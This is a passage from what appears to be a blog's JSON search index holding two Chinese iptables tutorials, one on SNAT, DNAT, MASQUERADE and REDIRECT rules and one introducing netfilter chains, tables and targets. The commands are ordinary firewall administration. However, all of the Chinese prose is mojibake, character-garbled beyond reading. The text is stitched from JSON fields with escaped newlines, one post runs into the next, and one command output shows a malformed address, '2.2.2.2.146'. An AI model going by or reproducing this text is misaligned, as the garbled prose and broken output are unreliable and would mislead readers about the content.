NATä»‹ç»\n\nå†…éƒ¨ç½‘ç»œçš„æŠ¥æ–‡å‘é€å‡ºå»æ—¶ï¼ŒæŠ¥æ–‡çš„æºIPä¼šè¢«ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯æºåœ°å€è½¬æ¢ï¼šSource Network Address Translationï¼Œç¼©å†™ä¸ºSNATã€‚\n\nå¤–éƒ¨ç½‘ç»œçš„æŠ¥æ–‡å“åº”æ—¶ï¼Œå“åº”æŠ¥æ–‡çš„ç›®æ ‡IPä¼šå†æ¬¡è¢«ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€è½¬æ¢ï¼šDestinationnetwork address translationï¼Œç¼©å†™ä¸ºDNATã€‚\n\næ•´ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºSNATè¿˜æ˜¯DNATï¼Œå–å†³äºæ•´ä¸ªè¿‡ç¨‹çš„å‰åŠæ®µä½¿ç”¨äº†SNATè¿˜æ˜¯DNATã€‚\n\n\n\n##### 9.3.2 æ“ä½œ\n\n```bash\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\niptables -t nat -nvL POSTROUTING\nChain POSTROUTING (policy ACCEPT 357 packets, 21639 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 SNAT       all  --  *      *       10.1.0.0/16          0.0.0.0/0            to:2.2.2.2\n```\n\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸Šå›¾ä¸­çš„è§„åˆ™è¡¨ç¤ºå°†æ¥è‡ªäº10.1.0.0/16ç½‘æ®µçš„æŠ¥æ–‡çš„æºåœ°å€æ”¹ä¸ºå…¬ç½‘IPåœ°å€(2.2.2.2)ã€‚\n\n\n\n1. \"-t nat\"è¡¨ç¤ºæ“ä½œnatè¡¨ï¼Œæˆ‘ä»¬ä¹‹å‰ä¸€ç›´åœ¨çŒè¾“ä¸€ä¸ªæ¦‚å¿µï¼Œå°±æ˜¯ä¸åŒçš„è¡¨æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œfilterè¡¨çš„åŠŸèƒ½æ˜¯è¿‡æ»¤ï¼Œnatè¡¨çš„åŠŸèƒ½å°±æ˜¯åœ°å€è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨natè¡¨ä¸­å®šä¹‰natè§„åˆ™ã€‚\n\n2. \"-A POSTROUTING\"è¡¨ç¤ºå°†SNATè§„åˆ™æ·»åŠ åˆ°POSTROUTINGé“¾çš„æœ«å°¾ï¼Œåœ¨centos7ä¸­ï¼ŒSNATè§„åˆ™åªèƒ½å­˜åœ¨äºPOSTROUTINGé“¾ä¸INPUTé“¾ä¸­ï¼Œåœ¨centos6ä¸­ï¼ŒSNATè§„åˆ™åªèƒ½å­˜åœ¨äºPOSTROUTINGé“¾ä¸­ã€‚\n\n3. ä¸ºä»€ä¹ˆSNATè§„åˆ™å¿…é¡»å®šä¹‰åœ¨POSTROUTINGé“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è®¤ä¸ºï¼ŒPOSTROUTINGé“¾æ˜¯iptablesä¸­æŠ¥æ–‡å‘å‡ºçš„æœ€åä¸€ä¸ª\"å…³å¡\"ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨æŠ¥æ–‡é©¬ä¸Šå‘å‡ºä¹‹å‰ï¼Œä¿®æ”¹æŠ¥æ–‡çš„æºåœ°å€ï¼Œå¦åˆ™å°±å†ä¹Ÿæ²¡æœ‰æœºä¼šä¿®æ”¹æŠ¥æ–‡çš„æºåœ°å€äº†ã€‚\n\n4. å¦‚æœåªæ˜¯ç”¨äºé…ç½®SNATçš„è¯ï¼Œæˆ‘ä»¬å¹¶ä¸ç”¨æ‰‹åŠ¨çš„è¿›è¡ŒDNATè®¾ç½®ï¼Œiptablesä¼šè‡ªåŠ¨ç»´æŠ¤NATè¡¨ï¼Œå¹¶å°†å“åº”æŠ¥æ–‡çš„ç›®æ ‡åœ°å€è½¬æ¢å›æ¥ã€‚\n\n\n\n### 9.4  DNAT(NATè¡¨)\n\nå…¬å¸åªæœ‰ä¸€ä¸ªå…¬ç½‘IPï¼Œä½†æ˜¯å…¬å¸çš„å†…ç½‘ä¸­å´æœ‰å¾ˆå¤šæœåŠ¡å™¨æä¾›å„ç§æœåŠ¡ï¼Œæˆ‘ä»¬å¯¹å¤–å®£ç§°ï¼Œå…¬å¸çš„å…¬ç½‘IPä¸Šæ—¢æä¾›äº†webæœåŠ¡ï¼Œä¹Ÿæä¾›äº†windowsè¿œç¨‹æ¡Œé¢ï¼Œä¸ç®¡æ˜¯è®¿é—®webæœåŠ¡è¿˜æ˜¯è¿œç¨‹æ¡Œé¢ï¼Œåªè¦è®¿é—®è¿™ä¸ªå…¬ç½‘IPå°±è¡Œäº†ï¼Œæˆ‘ä»¬åˆ©ç”¨DNATï¼Œå°†å…¬ç½‘å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç«¯å£å·åšäº†æ˜ å°„ï¼Œå°†è®¿é—®webæœåŠ¡çš„æŠ¥æ–‡è½¬å‘åˆ°äº†å†…ç½‘ä¸­çš„Cä¸»æœºä¸­ï¼Œå°†è®¿é—®è¿œç¨‹æ¡Œé¢çš„æŠ¥æ–‡è½¬å‘åˆ°äº†å†…ç½‘ä¸­çš„Dä¸»æœºä¸­ã€‚\n\n```bash\niptables -t nat -I PREROUTING -d 2.2.2.2 -p tcp --dport 3389 -j DNAT --to-destination 10.1.0.6:3389\n\n\niptables -t nat -vnL PREROUTING\nChain PREROUTING (policy ACCEPT 2 packets, 68 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            2.2.2.2.146        tcp dpt:3389 to:10.1.0.6:3389\n```\n\n\n\n1. \"-t nat -I PREROUTING\"è¡¨ç¤ºåœ¨natè¡¨ä¸­çš„PREROUTINGé“¾ä¸­é…ç½®DNATè§„åˆ™ï¼ŒDNATè§„åˆ™åªé…ç½®åœ¨PREROUTINGé“¾ä¸OUTPUTé“¾ä¸­ã€‚\n\n2. \"-d 2.2.2.2 -p tcp --dport 3389\"è¡¨ç¤ºæŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ºå…¬å¸çš„å…¬ç½‘IPåœ°å€ï¼Œç›®æ ‡ç«¯å£ä¸ºtcpçš„3389å·ç«¯å£ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ï¼Œwindowsè¿œç¨‹æ¡Œé¢ä½¿ç”¨çš„é»˜è®¤ç«¯å£å·å°±æ˜¯3389ï¼Œå½“å¤–éƒ¨ä¸»æœºè®¿é—®å…¬å¸å…¬ç½‘IPçš„3389å·ç«¯å£æ—¶ï¼ŒæŠ¥æ–‡åˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n3. \"-j DNAT --to-destination 10.1.0.6:3389\"è¡¨ç¤ºå°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡è¿›è¡ŒDNATï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€è½¬æ¢ï¼Œå°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç›®æ ‡ç«¯å£ä¿®æ”¹ä¸º10.1.0.6:3389ï¼Œ\"--to-destination\"å°±æ˜¯åŠ¨ä½œDNATçš„å¸¸ç”¨é€‰é¡¹ã€‚\n\n   é‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œå½“å¤–ç½‘ä¸»æœºè®¿é—®å…¬å¸å…¬ç½‘IP(2.2.2.2)çš„3389æ—¶ï¼Œå…¶æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç«¯å£å°†ä¼šè¢«æ˜ å°„åˆ°10.1.0.6:3389ä¸Šã€‚\n\n4. ç†è®ºä¸Šåªè¦å®Œæˆä¸Šè¿°DNATé…ç½®è§„åˆ™å³å¯ï¼Œä½†æ˜¯åœ¨æµ‹è¯•æ—¶ï¼Œåªé…ç½®DNATè§„åˆ™åï¼Œå¹¶ä¸èƒ½æ­£å¸¸DNATï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œå°†ç›¸åº”çš„SNATè§„åˆ™åŒæ—¶é…ç½®åï¼Œå³å¯æ­£å¸¸DNATï¼Œäºæ˜¯æˆ‘ä»¬åˆé…ç½®äº†SNATã€‚\n\n  ```bash\n  iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n  ```\n\n\n\n### 9.5 MASQUERADE\n\nå½“æˆ‘ä»¬æ‹¨å·ç½‘ä¸Šæ—¶ï¼Œæ¯æ¬¡åˆ†é…çš„IPåœ°å€å¾€å¾€ä¸åŒï¼Œä¸ä¼šé•¿æœŸåˆ†ç»™æˆ‘ä»¬ä¸€ä¸ªå›ºå®šçš„IPåœ°å€ï¼Œå¦‚æœè¿™æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦è®©å†…ç½‘ä¸»æœºå…±äº«å…¬ç½‘IPä¸Šç½‘ï¼Œå°±ä¼šå¾ˆéº»çƒ¦ï¼Œå› ä¸ºæ¯æ¬¡IPåœ°å€å‘ç”Ÿå˜åŒ–ä»¥åï¼Œæˆ‘ä»¬éƒ½è¦é‡æ–°é…ç½®SNATè§„åˆ™ï¼Œè¿™æ ·æ˜¾ç¤ºä¸æ˜¯å¾ˆäººæ€§åŒ–ï¼Œæˆ‘ä»¬é€šè¿‡MASQUERADEå³å¯è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒMASQUERADEä¼šåŠ¨æ€çš„å°†æºåœ°å€è½¬æ¢ä¸ºå¯ç”¨çš„IPåœ°å€ï¼Œå…¶å®ä¸SNATå®ç°çš„åŠŸèƒ½å®Œå…¨ä¸€è‡´ï¼Œéƒ½æ˜¯ä¿®æ”¹æºåœ°å€ã€‚\n\nåªä¸è¿‡SNATéœ€è¦æŒ‡æ˜å°†æŠ¥æ–‡çš„æºåœ°å€æ”¹ä¸ºå“ªä¸ªIPï¼Œè€ŒMASQUERADEåˆ™ä¸ç”¨æŒ‡å®šæ˜ç¡®çš„IPï¼Œä¼šåŠ¨æ€çš„å°†æŠ¥æ–‡çš„æºåœ°å€ä¿®æ”¹ä¸ºæŒ‡å®šç½‘å¡ä¸Šå¯ç”¨çš„IPåœ°å€ã€‚\n\n```bash\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\n# MASQUERADEçš„å¯¹æ¯”\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -o ç½‘å¡åå­— -j MASQUERADE\n```\n\nå¯ä»¥æŠŠMASQUERADEç†è§£ä¸ºåŠ¨æ€çš„ã€è‡ªåŠ¨åŒ–çš„SNATï¼Œå¦‚æœæ²¡æœ‰åŠ¨æ€SNATçš„éœ€æ±‚ï¼Œæ²¡æœ‰å¿…è¦ä½¿ç”¨MASQUERADEï¼Œå› ä¸ºSNATæ›´åŠ é«˜æ•ˆã€‚\n\n\n\n### 9.6 REDIRECT\n\nä½¿ç”¨REDIRECTåŠ¨ä½œå¯ä»¥åœ¨æœ¬æœºä¸Šè¿›è¡Œç«¯å£æ˜ å°„\n\næ¯”å¦‚ï¼Œå°†æœ¬æœºçš„80ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„8080ç«¯å£ä¸Š\n\n```bash\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n```\n\nç»è¿‡ä¸Šè¿°è§„åˆ™æ˜ å°„åï¼Œå½“åˆ«çš„æœºå™¨è®¿é—®æœ¬æœºçš„80ç«¯å£æ—¶ï¼ŒæŠ¥æ–‡ä¼šè¢«é‡å®šå‘åˆ°æœ¬æœºçš„8080ç«¯å£ä¸Šã€‚\n\nREDIRECTè§„åˆ™åªèƒ½å®šä¹‰åœ¨PREROUTINGé“¾æˆ–è€…OUTPUTé“¾ä¸­ã€‚\n","tags":["iptables"],"categories":["å‘½ä»¤"]},{"title":"iptablesä½¿ç”¨æ•™ç¨‹01","url":"%2Fp%2Fa8480986.html","content":"\n# 0. å‰è¨€\n\n### 0.0 é˜²ç«å¢™\n\n+ ä»é€»è¾‘ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥å¤§ä½“åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™ã€‚\n\n  + ä¸»æœºé˜²ç«å¢™ï¼šé’ˆå¯¹äºå•ä¸ªä¸»æœºè¿›è¡Œé˜²æŠ¤ã€‚\n  \n  ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£æˆ–è¾¹ç¼˜ï¼Œé’ˆå¯¹äºç½‘ç»œå…¥å£è¿›è¡Œé˜²æŠ¤ï¼ŒæœåŠ¡äºé˜²ç«å¢™èƒŒåçš„æœ¬åœ°å±€åŸŸç½‘ã€‚\n  \n  ç½‘ç»œé˜²ç«å¢™å’Œä¸»æœºé˜²ç«å¢™å¹¶ä¸å†²çªï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç½‘ç»œé˜²ç«å¢™ä¸»å¤–ï¼ˆé›†ä½“ï¼‰ï¼Œ ä¸»æœºé˜²ç«å¢™ä¸»å†…ï¼ˆä¸ªäººï¼‰ã€‚\n\n\n+ ä»ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™ã€‚\n+ ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°éƒ¨åˆ†é˜²ç«å¢™åŠŸèƒ½ï¼Œå¦ä¸€éƒ¨åˆ†åŠŸèƒ½åŸºäºè½¯ä»¶å®ç°ï¼Œæ€§èƒ½é«˜ï¼Œæˆæœ¬é«˜ã€‚\n+ è½¯ä»¶é˜²ç«å¢™ï¼šåº”ç”¨è½¯ä»¶å¤„ç†é€»è¾‘è¿è¡Œäºé€šç”¨ç¡¬ä»¶å¹³å°ä¹‹ä¸Šçš„é˜²ç«å¢™ï¼Œæ€§èƒ½ä½ï¼Œæˆæœ¬ä½ã€‚\n\n<!-- more -->\n\n### 0.1 iptables\n\niptableså…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„\"å®‰å…¨æ¡†æ¶\"ä¸­ï¼Œè¿™ä¸ª\"å®‰å…¨æ¡†æ¶\"æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«netfilter\n\nnetfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼ˆframeworkï¼‰ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚iptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚\n\nnetfilter/iptablesï¼ˆä¸‹æ–‡ä¸­ç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ ·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆå°åŒ…è¿‡æ»¤ã€å°åŒ…é‡å®šå‘å’Œç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ç­‰åŠŸèƒ½ã€‚\n\n### 0.2  netfilter\n\nnetfilteræ˜¯Linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š\n\n+ ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate)\n+ æ•°æ®åŒ…å†…å®¹ä¿®æ”¹\n+ ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½\n\næ‰€ä»¥è¯´ï¼Œè™½ç„¶æˆ‘ä»¬ä½¿ç”¨service iptables startå¯åŠ¨iptables\"æœåŠ¡\"ï¼Œä½†æ˜¯å…¶å®å‡†ç¡®çš„æ¥è¯´ï¼Œiptableså¹¶æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥ç®—æ˜¯å†…æ ¸æä¾›çš„åŠŸèƒ½ã€‚\n\n\n\n# 1. iptablesåŸºç¡€\n\næˆ‘ä»¬çŸ¥é“iptablesæ˜¯æŒ‰ç…§è§„åˆ™æ¥åŠäº‹çš„ï¼Œæˆ‘ä»¬å°±æ¥è¯´è¯´è§„åˆ™ï¼ˆrulesï¼‰ï¼Œè§„åˆ™å…¶å®å°±æ˜¯ç½‘ç»œç®¡ç†å‘˜é¢„å®šä¹‰çš„æ¡ä»¶ï¼Œè§„åˆ™ä¸€èˆ¬çš„å®šä¹‰ä¸º\"å¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…\"ã€‚\n\nè§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ï¼Œè¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®ï¼ˆå¦‚TCPã€UDPã€ICMPï¼‰å’ŒæœåŠ¡ç±»å‹ï¼ˆå¦‚HTTPã€FTPå’ŒSMTPï¼‰ç­‰ã€‚\n\nå½“æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ ¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†è¿™äº›æ•°æ®åŒ…ï¼Œå¦‚æ”¾è¡Œï¼ˆacceptï¼‰ã€æ‹’ç»ï¼ˆrejectï¼‰å’Œä¸¢å¼ƒï¼ˆdropï¼‰ç­‰ã€‚é…ç½®é˜²ç«å¢™çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ·»åŠ ã€ä¿®æ”¹å’Œåˆ é™¤è¿™äº›è§„åˆ™ã€‚\n\n\n\n### 1.1 äº”é“¾\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹01/1.png)\n\n+ PREROUTING æ•°æ®åŒ…åˆšè¿›å…¥ç½‘ç»œå±‚ , è·¯ç”±ä¹‹å‰\n+ INPUT è·¯ç”±åˆ¤æ–­ï¼Œæµå…¥ç”¨æˆ·ç©ºé—´\n+ OUTPUT ç”¨æˆ·ç©ºé—´å‘å‡ºï¼Œåæ¥è·¯ç”±åˆ¤æ–­å‡ºå£çš„ç½‘ç»œæ¥å£\n+ FORWARD è·¯ç”±åˆ¤æ–­ä¸è¿›å…¥ç”¨æˆ·ç©ºé—´ï¼Œåªè¿›è¡Œè½¬å‘\n+ POSTROUTING æ•°æ®åŒ…é€šè¿‡ç½‘ç»œæ¥å£å‡ºå»\n\n\n\n##### 1.1.1 ä¸¾ä¾‹:\n\nåˆ°æœ¬æœºæŸè¿›ç¨‹çš„æŠ¥æ–‡ï¼šPREROUTING --> INPUT\n\nç”±æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ï¼šPREROUTING --> FORWARD --> POSTROUTING\n\nç”±æœ¬æœºçš„æŸè¿›ç¨‹å‘å‡ºæŠ¥æ–‡ï¼ˆé€šå¸¸ä¸ºå“åº”æŠ¥æ–‡ï¼‰ï¼šOUTPUT --> POSTROUTING\n\n\n\n## 1.2 å››è¡¨\n\næˆ‘ä»¬æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åš\"è¡¨\"ï¼Œæ‰€ä»¥è¯´ï¼Œä¸åŒåŠŸèƒ½çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®åœ¨ä¸åŒçš„è¡¨ä¸­è¿›è¡Œç®¡ç†ï¼Œè€Œiptableså·²ç»ä¸ºæˆ‘ä»¬å®šä¹‰äº†4ç§è¡¨ï¼Œæ¯ç§è¡¨å¯¹åº”äº†ä¸åŒçš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è§„åˆ™ä¹Ÿéƒ½é€ƒè„±ä¸äº†è¿™4ç§åŠŸèƒ½çš„èŒƒå›´ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ iptablesä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆææ˜ç™½æ¯ç§è¡¨ çš„ä½œç”¨ã€‚\n\n+ filterè¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter\n+ natè¡¨ï¼šnetwork address translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat\n+ mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle\n+ rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½æ˜¯è¿™å››ç§åˆ†ç±»ä¸­çš„è§„åˆ™ï¼Œæˆ–è€…è¯´ï¼Œæ‰€æœ‰è§„åˆ™éƒ½å­˜åœ¨äºè¿™4å¼ \"è¡¨\"ä¸­ã€‚\n\n\n\n### 1.3 è¡¨é“¾å…³ç³»\n\n| å››è¡¨/äº”é“¾ | PREROUTING | INPUT      | FORWARD | OUTPUT | POSTROUTING |\n| --------- | ---------- | ---------- | ------- | ------ | ----------- |\n| filter    |            | âˆš          | âˆš       | âˆš      |             |\n| nat       | âˆš          | âˆš(centos7) |         | âˆš      | âˆš           |\n| mangle    | âˆš          | âˆš          | âˆš       | âˆš      | âˆš           |\n| raw       | âˆš          |            |         | âˆš      |             |\n\n\n\nè¡¨çš„ä¼˜å…ˆçº§å…³ç³»:  raw --> mangle --> nat --> filter ,  raw æœ€é«˜\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹01/2.png)\n\n\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹01/4.png)\n\n# 2. è§„åˆ™\n\nè§„åˆ™æ˜¯æ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼Œä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™åé¢æŒ‡å®šçš„å¤„ç†åŠ¨ä½œè¿›è¡Œå¤„ç†ï¼›\n\n### 2.1 åŒ¹é…æ¡ä»¶\n\nåŒ¹é…æ¡ä»¶åˆ†ä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ä¸æ‰©å±•åŒ¹é…æ¡ä»¶\n\n+ åŸºæœ¬åŒ¹é…æ¡ä»¶ï¼š\n  æºåœ°å€Source IPï¼Œç›®æ ‡åœ°å€ Destination IP\n  ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ã€‚\n+ æ‰©å±•åŒ¹é…æ¡ä»¶ï¼š\n  é™¤äº†ä¸Šè¿°çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿™äº›æ¡ä»¶æ³›ç§°ä¸ºæ‰©å±•æ¡ä»¶ï¼Œè¿™äº›æ‰©å±•æ¡ä»¶å…¶å®ä¹Ÿæ˜¯netfilterä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨è¿™äº›æ¡ä»¶ï¼Œåˆ™éœ€è¦ä¾èµ–å¯¹åº”çš„æ‰©å±•æ¨¡å—ã€‚\n  æºç«¯å£Source Port, ç›®æ ‡ç«¯å£Destination Port\n  ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºæ‰©å±•åŒ¹é…æ¡ä»¶\n\n### 2.2 å¤„ç†åŠ¨ä½œ\n\nå¤„ç†åŠ¨ä½œåœ¨iptablesä¸­è¢«ç§°ä¸ºtargetï¼ˆè¿™æ ·è¯´å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬æš‚ä¸”è¿™æ ·ç§°å‘¼ï¼‰ï¼ŒåŠ¨ä½œä¹Ÿå¯ä»¥åˆ†ä¸ºåŸºæœ¬åŠ¨ä½œå’Œæ‰©å±•åŠ¨ä½œã€‚\næ­¤å¤„åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„åŠ¨ä½œï¼Œä¹‹åçš„æ–‡ç« ä¼šå¯¹å®ƒä»¬è¿›è¡Œè¯¦ç»†çš„ç¤ºä¾‹ä¸æ€»ç»“ï¼š\n\n+ ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚\n+ DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚\n+ REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚\n+ SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚\n+ MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚\n+ DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚\n+ REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚\n+ LOGï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚\n\nè¡¥å……ä¸€ä¸‹DROPå’ŒREJECTçš„åŒºåˆ«ã€‚DROPæ˜¯ç›´æ¥æŠŠåŒ¹é…åˆ°çš„æŠ¥æ–‡ä¸¢å¼ƒï¼ŒREJECTé™¤äº†æŠŠæŠ¥æ–‡ä¸¢å¼ƒè¿˜ä¼šç»™è¯¥æŠ¥æ–‡ä¸­çš„æºIPå‘ä¸€ä¸ªICMPæŠ¥æ–‡è¯´æ˜ç›®çš„ä¸å¯è¾¾(ç›´æ¥å›å¤ä¸å¯è¾¾, æ›´å¼ºç¡¬)ã€‚å‰è€…æŠ¥æ–‡å‘é€æ–¹åªèƒ½ç­‰è¶…æ—¶ï¼Œè€Œåè€…å‘é€æ–¹å› ä¸ºæ”¶åˆ°äº†ICMPä¸å¯è¾¾æ‰€ä»¥é©¬ä¸Šå°±ç»™å‡ºäº†æç¤ºã€‚\n\n\n\n# 3. 